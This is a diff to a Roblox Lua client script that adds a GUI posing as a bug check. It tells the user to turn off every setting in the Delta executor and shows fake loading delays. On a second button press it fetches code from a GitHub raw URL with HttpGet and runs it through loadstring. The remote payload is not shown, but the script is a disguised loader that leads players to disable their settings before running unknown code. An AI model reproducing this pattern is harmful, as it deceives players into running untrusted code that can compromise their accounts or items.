@@ -1,30 +1,69 @@
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "DeltaWarningGui"
 
--- Create the ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "WarningGui"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = player:WaitForChild("PlayerGui")
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.4, 0, 0.3, 0)
+frame.Position = UDim2.new(0.3, 0, 0.35, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.Parent = gui
 
--- Create the background
-local background = Instance.new("Frame")
-background.Size = UDim2.new(1, 0, 1, 0)
-background.Position = UDim2.new(0, 0, 0, 0)
-background.BackgroundColor3 = Color3.new(0, 0, 0) -- Black
-background.BackgroundTransparency = 0
-background.Parent = screenGui
+-- Message Text
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, -20, 0.6, -10)
+label.Position = UDim2.new(0, 10, 0, 10)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.new(1, 1, 1)
+label.Font = Enum.Font.SourceSansBold
+label.TextScaled = true
+label.Text = "Finding bug..."
+label.Parent = frame
 
--- Create the warning text
-local warningText = Instance.new("TextLabel")
-warningText.Size = UDim2.new(0.9, 0, 0.5, 0)
-warningText.Position = UDim2.new(0.05, 0, 0.25, 0)
-warningText.BackgroundTransparency = 1
-warningText.TextColor3 = Color3.new(1, 0, 0) -- Red
-warningText.TextStrokeTransparency = 0
-warningText.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black stroke
-warningText.Font = Enum.Font.GothamBlack
-warningText.TextScaled = true
-warningText.TextWrapped = true
-warningText.Text = "⚠️ HOY! Hindi gagana 'to pag hindi mo in-off lahat sa settings ng Delta.\nClick mo muna yung Delta – ayan, yung cheat sa taas mo –\ntapos sa settings, i-OFF mo LAHAT 'yon!"
-warningText.Parent = background
+-- Check Button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.5, 0, 0.25, 0)
+button.Position = UDim2.new(0.25, 0, 0.7, 0)
+button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Font = Enum.Font.SourceSans
+button.TextScaled = true
+button.Text = "Check"
+button.Visible = false
+button.Parent = frame
+
+-- States
+local attempt = 0
+local debounce = false
+
+-- Step 1: Wait 7 seconds, then update text
+task.delay(7, function()
+	label.Text = "Please turn off everything on Delta settings\nClick Delta menu -> settings logo\nAnd off everything"
+	button.Visible = true
+end)
+
+-- Step 2: Button logic
+button.MouseButton1Click:Connect(function()
+	if debounce then return end
+	debounce = true
+	attempt += 1
+
+	if attempt == 1 then
+		button.Text = "Loading..."
+		task.wait(10)
+
+		-- Show countdown warning for 10s
+		for i = 10, 1, -1 do
+			button.Text = "Please turn off everything on Delta (" .. i .. ")"
+			task.wait(1)
+		end
+
+		button.Text = "Check"
+		debounce = false
+
+	elseif attempt == 2 then
+		gui:Destroy()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/eggChanger/refs/heads/main/main"))()
+	end
+end)
